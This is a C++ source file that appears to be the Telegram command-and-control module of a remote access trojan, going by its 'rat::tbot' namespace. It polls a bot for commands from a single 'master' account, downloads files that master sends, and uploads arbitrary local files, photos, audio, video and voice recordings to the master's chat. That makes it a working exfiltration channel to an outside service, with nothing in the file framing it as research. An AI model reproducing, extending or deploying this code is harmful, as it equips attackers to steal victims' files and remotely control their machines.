#include "rat/tbot/tbot.hpp"
#include "rat/networking.hpp"

#include <nlohmann/json.hpp>
#include <fmt/core.h>
#include <filesystem>
#include <fstream>

#include "logging.hpp"
#include "rat/tbot/types.hpp"

namespace rat::tbot {

// ------------------------ Helpers ------------------------

static inline File _parseFileFromJson(const json& File_Json) {
    std::string file_id   = File_Json.value("file_id", "");
    std::string mime_type = File_Json.value("mime_type", "");
    size_t file_size      = 0;

    if (File_Json.contains("file_size")) {
        if (File_Json["file_size"].is_number_unsigned()) {
            file_size = File_Json["file_size"].get<size_t>();
        } else if (File_Json["file_size"].is_string()) {
            try { file_size = std::stoull(File_Json["file_size"].get<std::string>()); } catch (...) {}
        }
    }

    std::optional<std::string> name = std::nullopt;
    if (File_Json.contains("file_name")) name = File_Json["file_name"].get<std::string>();

    return File{file_id, mime_type, file_size, name};
}

static inline Update _parseJsonToUpdate(const json& update_json) {
    Update update{};
    update.id = update_json.value("update_id", 0);

    const json* message_ptr = nullptr;
    if (update_json.contains("message")) {
        message_ptr = &update_json["message"];
    } else if (update_json.contains("edited_message")) {
        message_ptr = &update_json["edited_message"];
    } else if (update_json.contains("channel_post")) {
        message_ptr = &update_json["channel_post"];
    }

    if (!message_ptr) return update;

    const auto& msg = *message_ptr;
    Message message{};
    message.id     = msg.value("message_id", 0);
    message.origin = msg.value("from", json::object()).value("id", 0);
    message.text   = msg.value("text", "");

    if (msg.contains("photo") && msg["photo"].is_array() && !msg["photo"].empty()) {
        const auto& photo = msg["photo"].back();
        message.files.emplace_back(photo.value("file_id", ""), "image/jpeg", photo.value("file_size", 0));
    }

    if (msg.contains("document")) message.files.emplace_back(_parseFileFromJson(msg["document"]));
    if (msg.contains("audio"))    message.files.emplace_back(_parseFileFromJson(msg["audio"]));
    if (msg.contains("video"))    message.files.emplace_back(_parseFileFromJson(msg["video"]));

    update.message = std::move(message);
    return update;
}

// ------------------------ Bot methods ------------------------

Bot::Bot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timemout)
    : token(arg_Token),
      master_id(Master_Id),
      last_update_id(0),
      update_interval(1000),
      curl_client() {

    this->sending_message_url_base = fmt::format("{}{}/sendMessage?chat_id={}&text=", TELEGRAM_BOT_API_BASE_URL, token,master_id);
    
    this->sending_document_url     = fmt::format("{}{}/sendDocument", TELEGRAM_BOT_API_BASE_URL, token);
    this->sending_photo_url        = fmt::format("{}{}/sendPhoto", TELEGRAM_BOT_API_BASE_URL, token);
    
    this->sending_audio_url        = fmt::format("{}{}/sendAudio", TELEGRAM_BOT_API_BASE_URL, token);
    this->sending_video_url        = fmt::format("{}{}/sendVideo", TELEGRAM_BOT_API_BASE_URL, token);
    
    this->sending_voice_url        = fmt::format("{}{}/sendVoice", TELEGRAM_BOT_API_BASE_URL, token);
    this->getting_file_url         = fmt::format("{}{}/getFile?file_id=", TELEGRAM_BOT_API_BASE_URL, token);
    this->getting_update_url       = fmt::format("{}{}/getUpdates?timeout={}&limit=1", TELEGRAM_BOT_API_BASE_URL, token, Telegram_Connection_Timemout);
}
Bot::Bot(const Bot& other)
    : token(other.token),
      master_id(other.master_id),
      curl_client() {}


std::string Bot::getToken() const { 
    return token; 
}
int64_t Bot::getMasterId() const {
    return master_id; 
}
int64_t Bot::getLastUpdateId() const { 
    return last_update_id; 
}

void Bot::setUpdateIterval(uint16_t Update_Interval) {
    update_interval = Update_Interval;
}

void Bot::setOffset() {
    try {
        std::string init_url = fmt::format("{}{}/getUpdates?offset=-1&limit=1", TELEGRAM_BOT_API_BASE_URL, token);

        UpdateBuffer init_buffer;
        size_t bytes_read = curl_client.sendHttpRequest(init_url, init_buffer.data(), init_buffer.size());

        if (bytes_read > 0) {
            auto resp_json = json::parse(init_buffer.data(), init_buffer.data() + bytes_read);

            if (resp_json.value("ok", false) &&
                resp_json.contains("result") &&
                resp_json["result"].is_array() &&
                !resp_json["result"].empty()) {

                const auto& latest_update = resp_json["result"][0];
                last_update_id = latest_update.value("update_id", 0);

                DEBUG_LOG("Initialized with latest update_id: {}", last_update_id);
            }
        }
    } catch (const std::exception& e) {
        ERROR_LOG("Failed to get latest update ID: {}", e.what());
    }
}

BotResponse Bot::sendMessage(const std::string& Text_Message) {
    try {
        char* escaped = curl_easy_escape(nullptr, Text_Message.c_str(), static_cast<int>(Text_Message.size()));
        if (!escaped) return BotResponse::UNKNOWN_ERROR;

        std::string url = sending_message_url_base + escaped;
        curl_free(escaped);

        DEBUG_LOG("Sending message: {}", url);

        MessageResponseBuffer response_buffer;
        size_t bytes_read = curl_client.sendHttpRequest(url, response_buffer.data(), response_buffer.size());

        if (bytes_read == 0) return BotResponse::CONNECTION_ERROR;

        auto resp = json::parse(response_buffer.data(), response_buffer.data() + bytes_read);
        return resp.value("ok", false) ? BotResponse::SUCCESS : BotResponse::UNKNOWN_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendMessage exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}
BotResponse Bot::sendMessage(const char* Text_Message) {
    try {
        if (!Text_Message) return BotResponse::UNKNOWN_ERROR;

        // Escape raw C-string with explicit length
        char* escaped = curl_easy_escape(nullptr, Text_Message, static_cast<int>(std::strlen(Text_Message)));
        if (!escaped) return BotResponse::UNKNOWN_ERROR;

        // Build the URL in a single allocation
        std::string url;
        url.reserve(sending_message_url_base.size() + std::strlen(escaped));
        url.append(sending_message_url_base);
        url.append(escaped);
        curl_free(escaped);

        DEBUG_LOG("Sending message: {}", url);

        MessageResponseBuffer response_buffer;
        size_t bytes_read = curl_client.sendHttpRequest(url.c_str(), response_buffer.data(), response_buffer.size());

        if (bytes_read == 0) return BotResponse::CONNECTION_ERROR;

        auto resp = json::parse(response_buffer.data(), response_buffer.data() + bytes_read);
        return resp.value("ok", false) ? BotResponse::SUCCESS : BotResponse::UNKNOWN_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendMessage exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}

BotResponse Bot::sendFile(const std::filesystem::path& File_Path, const std::string& arg_Caption) {
    try {
        if (!std::filesystem::exists(File_Path)) {
            ERROR_LOG("sendFile: file does not exist: {}", File_Path.string());
            return BotResponse::CONNECTION_ERROR;
        }

        auto file_size = std::filesystem::file_size(File_Path);
        DEBUG_LOG("sendFile: entering with '{}', size={} bytes", File_Path.string(), file_size);

        std::string extension = File_Path.extension().string();
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
        DEBUG_LOG("sendFile: detected extension '{}'", extension);

        // Route to specialized methods
        if (extension == ".jpg" || extension == ".jpeg" || extension == ".png") {
            DEBUG_LOG("sendFile: routed to sendPhoto() for {}", File_Path.string());
            return this->sendPhoto(File_Path, arg_Caption);
        }

        DEBUG_LOG("sendFile: constructing MimeContext for generic document");

        // Generic document handling
        rat::networking::MimeContext ctx;
        ctx.file_path       = File_Path;
        ctx.url             = sending_document_url;
        ctx.file_field_name = "document";
        ctx.fields_map      = { {"chat_id", std::to_string(master_id)} };

        if (!arg_Caption.empty()) {
            ctx.fields_map["caption"] = arg_Caption;
            DEBUG_LOG("sendFile: added caption '{}'", arg_Caption);
        }

        // Map common MIME types
        if      (extension == ".txt")  ctx.mime_type = "text/plain";
        else if (extension == ".mp3")  ctx.mime_type = "audio/mp3";
        else if (extension == ".ogg")  ctx.mime_type = "audio/ogg";
        else if (extension == ".mp4")  ctx.mime_type = "video/mpeg";
        else if (extension == ".pdf")  ctx.mime_type = "application/pdf";
        else if (extension == ".zip")  ctx.mime_type = "application/zip";
        else if (extension == ".rar")  ctx.mime_type = "application/vnd.rar";
        else if (extension == ".7z")   ctx.mime_type = "application/x-7z-compressed";
        else if (extension == ".csv")  ctx.mime_type = "text/csv";
        else if (extension == ".json") ctx.mime_type = "application/json";
        else if (extension == ".xml")  ctx.mime_type = "application/xml";
        else if (extension == ".doc")  ctx.mime_type = "application/msword";
        else if (extension == ".docx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        else if (extension == ".xls")  ctx.mime_type = "application/vnd.ms-excel";
        else if (extension == ".xlsx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        else if (extension == ".ppt")  ctx.mime_type = "application/vnd.ms-powerpoint";
        else if (extension == ".pptx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
        else if (extension == ".wav")  ctx.mime_type = "audio/wav";
        else if (extension == ".mov")  ctx.mime_type = "video/quicktime";
        else if (extension == ".avi")  ctx.mime_type = "video/x-msvideo";
        else ctx.mime_type             = "application/octet-stream"; // fallback

        DEBUG_LOG("sendFile: mime_type resolved to '{}'", ctx.mime_type);

        DEBUG_LOG("sendFile: invoking uploadMimeFile() for {}", File_Path.string());
        bool result = this->curl_client.uploadMimeFile(ctx);

        if (!result) {
            ERROR_LOG("sendFile: uploadMimeFile() failed for '{}'", File_Path.string());
        } else {
            DEBUG_LOG("sendFile: uploadMimeFile() succeeded for '{}'", File_Path.string());
        }

        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendFile: exception '{}'", e.what());
        return BotResponse::CONNECTION_ERROR;
    } catch (...) {
        ERROR_LOG("sendFile: unknown exception");
        return BotResponse::CONNECTION_ERROR;
    }
}


BotResponse Bot::sendPhoto(const std::filesystem::path& Photo_Path, const std::string& arg_Caption) {
    try {
        DEBUG_LOG("Uploading photo: {}", Photo_Path.string());
        
        rat::networking::MimeContext ctx;
        ctx.file_path = Photo_Path;
        ctx.url = sending_photo_url;  // URL without chat_id now
        ctx.file_field_name = "photo";
        ctx.fields_map = {
            {"chat_id", std::to_string(master_id)}
            // Can add more fields like "caption", "parse_mode", etc.
        };
        
        bool result = curl_client.uploadMimeFile(ctx);
        if (!result) {
            ERROR_LOG("Failed at uploading {}", Photo_Path.string());
        }
        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
    } catch (const std::exception& e) {
        ERROR_LOG("sendPhoto exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}
// ------------------------ Audio ------------------------
BotResponse Bot::sendAudio(const std::filesystem::path& Audio_Path, const std::string& arg_Caption) {
    try {
        DEBUG_LOG("Uploading audio: {}", Audio_Path.string());

        rat::networking::MimeContext ctx;
        ctx.file_path       = Audio_Path;
        ctx.url             = sending_audio_url;  // Telegram API sendAudio endpoint
        ctx.file_field_name = "audio";
        ctx.fields_map = {
            {"chat_id", std::to_string(master_id)}
        };

        if (!arg_Caption.empty()) {
            ctx.fields_map["caption"] = arg_Caption;
        }

        // Optionally set MIME type
        ctx.mime_type = "audio/mpeg"; // default for mp3/m4a

        bool result = curl_client.uploadMimeFile(ctx);
        if (!result) {
            ERROR_LOG("Failed at uploading audio: {}", Audio_Path.string());
        }
        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendAudio exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}

// ------------------------ Video ------------------------
BotResponse Bot::sendVideo(const std::filesystem::path& Video_Path, const std::string& arg_Caption) {
    try {
        DEBUG_LOG("Uploading video: {}", Video_Path.string());

        rat::networking::MimeContext ctx;
        ctx.file_path       = Video_Path;
        ctx.url             = sending_video_url;  // Telegram API sendVideo endpoint
        ctx.file_field_name = "video";
        ctx.fields_map = {
            {"chat_id", std::to_string(master_id)}
        };

        if (!arg_Caption.empty()) {
            ctx.fields_map["caption"] = arg_Caption;
        }

        ctx.mime_type = "video/mp4"; // default for mp4

        bool result = curl_client.uploadMimeFile(ctx);
        if (!result) {
            ERROR_LOG("Failed at uploading video: {}", Video_Path.string());
        }
        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendVideo exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}

// ------------------------ Voice ------------------------
BotResponse Bot::sendVoice(const std::filesystem::path& Voice_Path, const std::string& arg_Caption) {
    try {
        DEBUG_LOG("Uploading voice message: {}", Voice_Path.string());

        rat::networking::MimeContext ctx;
        ctx.file_path       = Voice_Path;
        ctx.url             = sending_voice_url;  // Telegram API sendVoice endpoint
        ctx.file_field_name = "voice";
        ctx.fields_map = {
            {"chat_id", std::to_string(master_id)}
        };

        if (!arg_Caption.empty()) {
            ctx.fields_map["caption"] = arg_Caption;
        }

        ctx.mime_type = "audio/ogg"; // default for Telegram voice messages

        bool result = curl_client.uploadMimeFile(ctx);
        if (!result) {
            ERROR_LOG("Failed at uploading voice message: {}", Voice_Path.string());
        }
        return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendVoice exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}


bool Bot::downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path) {
    try {
        std::string get_file_url = fmt::format("{}{}", getting_file_url , File_Id);

        FileOperationResponseBuffer response_data;
        size_t bytes_read = this->curl_client.sendHttpRequest(get_file_url, response_data.data(), response_data.size());

        if (bytes_read == 0) return false;
        DEBUG_LOG("Bytes that were retrieved from the https request {}", bytes_read);
        auto resp_json = json::parse(response_data.data(), response_data.data() + bytes_read);
        if (!resp_json.value("ok", false)) return false;

        std::string file_path = resp_json["result"]["file_path"].get<std::string>();
        std::string file_url  = fmt::format("{}/file/bot{}/{}", TELEGRAM_API_URL, token, file_path);

        auto file_data = this->curl_client.sendHttpRequest(file_url);

        std::ofstream ofs(Out_Path, std::ios::binary);
        if (!ofs) return false;

        ofs.write(file_data.data(), file_data.size());
        return true;
    } catch (const std::exception& e) {
        ERROR_LOG("downloadFile exception: {}", e.what());
        return false;
    }
}

Update Bot::getUpdate() {
    try {
        std::string url = fmt::format("{}&offset={}&limit=1", getting_update_url, last_update_id + 1);

        DEBUG_LOG("Polling updates with offset: {}", last_update_id + 1);

        UpdateBuffer update_buffer;
        size_t bytes_read = curl_client.sendHttpRequest(url, update_buffer.data(), update_buffer.size());

        if (bytes_read == 0) return {};

        auto resp_json = json::parse(update_buffer.data(), update_buffer.data() + bytes_read);

        if (!resp_json.value("ok", false) ||
            !resp_json.contains("result") ||
            !resp_json["result"].is_array() ||
            resp_json["result"].empty()) {
            return {};
        }

        const auto& update_json = resp_json["result"][0];
        Update update = _parseJsonToUpdate(update_json);

        last_update_id = update.id;
        return update;

    } catch (const std::exception& e) {
        ERROR_LOG("getUpdate exception: {}", e.what());
        return {};
    }
}

} // namespace rat::tbot

